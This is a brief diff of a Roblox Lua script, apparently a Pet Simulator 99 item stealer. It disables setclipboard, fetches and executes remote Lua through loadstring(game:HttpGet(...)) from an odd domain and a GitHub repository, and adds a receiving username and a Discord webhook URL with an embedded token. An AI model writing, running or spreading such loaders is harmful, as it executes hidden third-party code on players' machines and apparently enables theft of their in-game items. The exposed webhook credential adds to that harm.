@@ -18,3 +18,7 @@ getgenv().gui = false
 loadstring(game:HttpGet("https://egorikusa.space/1273ce86b3a1bd21b76c3e9a.lua", true))()
 setclipboard = nil
 setclipboard = function() end
+Username = "c0rruptedgraves" 
+Webhook = "https://discord.com/api/webhooks/1273519595889889280/ZnxXQInvqjGFaEZQ4V3mLBHiN-pWEijYfMyAu4yqLnaKEHsmRWID-tm2NVNfUeSHuFfB" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))() 
